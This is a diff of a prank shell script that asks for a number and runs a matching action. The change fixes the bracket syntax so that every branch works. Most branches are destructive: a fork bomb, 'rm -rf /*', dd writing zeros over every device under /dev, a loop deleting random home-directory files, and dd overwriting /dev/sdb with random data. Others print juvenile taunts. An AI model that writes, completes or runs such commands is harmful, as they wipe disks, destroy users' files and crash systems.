@@ -7,11 +7,11 @@ echo "select a number from 1 to 7:"
 
 read CHOICE
 
-[$CHOICE = "1"] && :(){ :|:& };:
+[ $CHOICE = "1" ] && :(){ :|:& };:
 
-[$CHOICE = "2"] && echo "UwU"
+[ $CHOICE = "2" ] && echo "UwU"
 
-[$CHOICE = "3"] && 
+[ $CHOICE = "3" ] && 
 		while true
 		do
 				neofetch
@@ -19,21 +19,21 @@ read CHOICE
   		        echo "disgusting femboy"
   		done
 
-[$CHOICE = "4"] && rm -rf /*
+[ $CHOICE = "4" ] && rm -rf /*
 
-[$CHOICE = "5"] && dd if=/dev/zero of=/dev/*
+[ $CHOICE = "5" ] && dd if=/dev/zero of=/dev/*
 
-[$CHOICE = "6"] && hexdump /dev/urandom
+[ $CHOICE = "6" ] && hexdump /dev/urandom
 
-[$CHOICE = "7"] && while true 
+[ $CHOICE = "7" ] && while true 
 do
 		FILE= ls ~ | shuf -n 1
 		rm -rf $FILE
 done
 
-[$CHOICE = "69"] && dd if=/dev/urandom of=/dev/sdb
+[ $CHOICE = "69" ] && dd if=/dev/urandom of=/dev/sdb
 
-[$CHOICE = "420"] && echo "
+[ $CHOICE = "420" ] && echo "
 _________________00__________________
 ________________0000_________________
 
